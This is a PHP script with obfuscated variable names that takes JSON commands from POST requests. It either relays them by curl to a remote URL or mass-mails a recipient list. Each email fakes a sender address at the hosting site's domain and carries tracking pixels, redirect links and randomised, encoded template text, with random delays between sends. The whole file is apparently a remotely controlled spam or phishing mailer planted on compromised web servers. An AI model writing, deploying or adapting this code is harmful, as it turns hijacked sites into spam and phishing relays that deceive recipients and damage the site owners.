<?php
@ini_set('max_execution_time', '3600'); @ini_set('max_input_time', '3600'); @set_time_limit(3600); @date_default_timezone_set('UTC'); class Macros { private $values = array(); private $fixed = array(); private $used = array(); private $_keys = array(); public function __get($spa5e5cc) { if ($spa5e5cc == 'keys') { return array_keys($this->_keys); } } public function Import($spa5e5cc, $sp8ec788) { if (is_array($sp8ec788)) { $this->values[$spa5e5cc] = array(); foreach ($sp8ec788 as $spfb87da) { if (!empty($spfb87da['key'])) { $this->values[$spa5e5cc][$spfb87da['key']] = $spfb87da['value']; } else { $this->values[$spa5e5cc][] = $spfb87da['value']; } } } else { $this->Assign($spa5e5cc, $sp8ec788); } } public function Assign($spa5e5cc, $sp5c1db0) { $this->values[$spa5e5cc] = $sp5c1db0; } public function Parse($sp79e5e3) { $sp70622d = ''; $spdaa0c3 = 0; while (true) { $spb0ad31 = strpos($sp79e5e3, '{', $spdaa0c3); if ($spb0ad31 === false) { $sp70622d .= substr($sp79e5e3, $spdaa0c3); break; } $sp70622d .= substr($sp79e5e3, $spdaa0c3, $spb0ad31 - $spdaa0c3); $spdaa0c3 = $spb0ad31 + 1; $spcc84e7 = ''; $sp1328d0 = '{'; $sp8c8f3f = array(); $sp55e96c = false; $spb98546 = false; $sp521b9b = 'var'; while ($spdaa0c3 < strlen($sp79e5e3)) { $spb9fcfb = substr($sp79e5e3, $spdaa0c3, 1); $sp1328d0 .= $spb9fcfb; if ($spb9fcfb == ',' || $spb9fcfb == '>' || $spb9fcfb == '|') { if ($sp521b9b == 'alias') { $sp55e96c = $spcc84e7; } elseif ($sp521b9b == 'mod') { $spb98546 = $spcc84e7; } else { $sp8c8f3f[] = $spcc84e7; } $spcc84e7 = ''; if ($spb9fcfb == '>') { $sp521b9b = 'alias'; } if ($spb9fcfb == '|') { $sp521b9b = 'mod'; } $spdaa0c3++; continue; } if ($spb9fcfb == '}') { if ($sp521b9b == 'alias') { $sp55e96c = $spcc84e7; } elseif ($sp521b9b == 'mod') { $spb98546 = $spcc84e7; } else { $sp8c8f3f[] = $spcc84e7; } $spdaa0c3++; break; } $spcc84e7 .= $spb9fcfb; if (preg_match('/[0-9A-Za-z_\\[\\]\\-\\^!]/', $spb9fcfb) == 0) { $spdaa0c3++; $sp8c8f3f = array(); break; } $spdaa0c3++; } if (sizeof($sp8c8f3f) == 0) { $sp70622d .= $sp1328d0; continue; } $sp85fc0f = false; $sp4f0fd2 = false; if (preg_match('/^\\^/', $sp8c8f3f[0]) > 0) { $sp8c8f3f[0] = substr($sp8c8f3f[0], 1); $sp85fc0f = true; } if (preg_match('/^\\!/', $sp8c8f3f[0]) > 0) { $sp8c8f3f[0] = substr($sp8c8f3f[0], 1); $sp4f0fd2 = true; } $spfc65ea = false; if (preg_match('/\\[([0-9A-Za-z_]+)\\]/', $sp8c8f3f[0], $spd786e8) > 0) { $spfc65ea = $spd786e8[1]; } elseif (preg_match('/\\[([\\d\\-]+)\\]/', $sp8c8f3f[0], $spd786e8) > 0) { $spfc65ea = explode('-', $spd786e8[1]); } if ($spfc65ea !== false) { $sp8c8f3f[0] = substr($sp8c8f3f[0], 0, strpos($sp8c8f3f[0], '[')); } $this->_keys[$sp8c8f3f[0]] = true; if (empty($this->values[$sp8c8f3f[0]]) && empty($this->fixed[$sp8c8f3f[0]])) { continue; } if ($sp85fc0f) { unset($this->fixed[$sp8c8f3f[0]]); } if (isset($this->fixed[$sp8c8f3f[0]])) { $spce237b = $this->fixed[$sp8c8f3f[0]]; } else { $spce237b = ''; $spc1a468 = 1; if (sizeof($sp8c8f3f) == 2) { $spc1a468 = $sp8c8f3f[1]; } if (sizeof($sp8c8f3f) == 3) { $spc1a468 = rand($sp8c8f3f[1], $sp8c8f3f[2]); } for ($sp14b377 = 0; $sp14b377 < $spc1a468; $sp14b377++) { if (is_array($this->values[$sp8c8f3f[0]])) { if (!is_array($this->used[$sp8c8f3f[0]])) { $this->used[$sp8c8f3f[0]] = array(); } if (count($this->used[$sp8c8f3f[0]]) == count($this->values[$sp8c8f3f[0]])) { $this->used[$sp8c8f3f[0]] = array(); } if ($spfc65ea !== false && is_scalar($spfc65ea)) { $spce237b .= $this->values[$sp8c8f3f[0]][$spfc65ea]; $this->used[$spfc65ea] = true; } else { $sp49d346 = array(); if (is_array($spfc65ea)) { $sp2d39d4 = $spfc65ea[0]; $spe61bf8 = $spfc65ea[1]; } else { $sp2d39d4 = 0; $spe61bf8 = count($this->values[$sp8c8f3f[0]]) - 1; } for ($spf7ce1e = $sp2d39d4; $spf7ce1e <= $spe61bf8; $spf7ce1e++) { if ($sp4f0fd2 && !empty($this->used[$sp8c8f3f[0]][$spf7ce1e])) { continue; } $sp49d346[] = $spf7ce1e; } $sp1dad6f = $sp49d346[rand(0, count($sp49d346) - 1)]; $this->used[$sp8c8f3f[0]][$sp1dad6f] = true; $spce237b .= $this->values[$sp8c8f3f[0]][$sp1dad6f]; } } else { $spce237b .= $this->values[$sp8c8f3f[0]]; } } } $spce237b = $this->Parse($spce237b); if ($spb98546 !== false) { for ($sp418296 = 0; $sp418296 < strlen($spb98546); $sp418296++) { switch (substr($spb98546, $sp418296, 1)) { case 'b': $spce237b = base64_encode($spce237b); break; case 'q': $spce237b = quoted_printable_encode($spce237b); break; default: break; } } } if ($sp85fc0f) { $this->fixed[$sp8c8f3f[0]] = $spce237b; } if ($sp55e96c !== false && $sp55e96c != '') { $this->fixed[$sp55e96c] = $spce237b; } $sp70622d .= $spce237b; } return $sp70622d; } } $sp63c60d = file_get_contents('php://input'); $spb1b274 = json_decode($sp63c60d, true); if (empty($spb1b274['via_proxy'])) { $spb1b274['via_proxy'] = true; $sp96165f = curl_init($spb1b274['prefix'] . $spb1b274['files']['s']); $sp021e74 = json_encode($spb1b274); curl_setopt($sp96165f, CURLOPT_CONNECTTIMEOUT, 30); curl_setopt($sp96165f, CURLOPT_TIMEOUT, 600); curl_setopt($sp96165f, CURLOPT_RETURNTRANSFER, true); curl_setopt($sp96165f, CURLOPT_USERAGENT, 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15'); curl_setopt($sp96165f, CURLOPT_REFERER, $sp333002); curl_setopt($sp96165f, CURLOPT_POST, true); curl_setopt($sp96165f, CURLOPT_POSTFIELDS, $sp021e74); curl_setopt($sp96165f, CURLOPT_HTTPHEADER, array('Content-Type: application/json', 'Content-Length: ' . strlen($sp021e74))); $sp5d90ca = curl_exec($sp96165f); echo $sp5d90ca; die; } $sp928b2a = $_SERVER['SERVER_ADDR']; $sp6b887c = $_SERVER['HTTP_HOST']; $sp6b887c = preg_replace('/^www\\./', '', $sp6b887c); $sp0c6563 = new Macros(); $sp0c6563->Assign('server_addr', $sp928b2a); $sp0c6563->Assign('server_host', $sp6b887c); foreach ($spb1b274['macros'] as $spa5e5cc => $sp8ec788) { $sp0c6563->Import($spa5e5cc, $sp8ec788); } $sp9fa1fa = preg_replace('/^www\\./i', '', $sp6b887c); $spb88c40 = $sp0c6563->Parse('{from_user}@' . $sp9fa1fa); $sp0c6563->Assign('from_email', $spb88c40); $sp0c6563->Assign('prefix', $spb1b274['prefix']); $sp0c6563->Assign('html', $spb1b274['letter']['html']); $spdaa0c3 = 0; $sp057529 = 0; $sp22c0f3 = 0; $sp867caa = array(); foreach ($spb1b274['rcpt'] as $sp4c67b7) { $sp0c6563->Assign('email', $sp4c67b7['email']); $sp0c6563->Assign('entry', $sp4c67b7); $sp0c6563->Assign('date', date('r')); $sp0c6563->Assign('redirect', $spb1b274['prefix'] . $spb1b274['files']['r']); $sp0c6563->Assign('redirect_with_uri', $spb1b274['prefix'] . $spb1b274['files']['r'] . '?uri='); $sp0c6563->Assign('unsubscribe', $spb1b274['prefix'] . $spb1b274['files']['u'] . '?id=' . $sp4c67b7['id']); $sp0c6563->Assign('delivery', '<img src="' . $spb1b274['prefix'] . $spb1b274['files']['d'] . '?id=' . $sp4c67b7['id'] . '" />'); $sp2d1e4b = $sp0c6563->Parse($spb1b274['envelope']['header']); $spf62d80 = $sp0c6563->Parse($spb1b274['envelope']['body']); if (!empty($sp4c67b7['name'])) { $spb7a66c = $sp4c67b7['name'] . ' <' . $sp4c67b7['email'] . '>'; } else { $spb7a66c = $sp4c67b7['email']; } $sp2c34d1 = $sp0c6563->Parse($spb1b274['letter']['subject']); if ($spdaa0c3 > 0) { sleep(rand(3, 8)); } $sp552d73 = mail($spb7a66c, $sp2c34d1, $spf62d80, $sp2d1e4b); $sp867caa[$sp4c67b7['id']] = $sp552d73; if ($sp552d73) { $sp057529++; } else { $sp22c0f3++; } $spdaa0c3++; } echo serialize(array('total' => count($spb1b274['rcpt']), 'sent' => $spdaa0c3, 'success' => $sp057529, 'error' => $sp22c0f3, 'rcpt' => $sp867caa));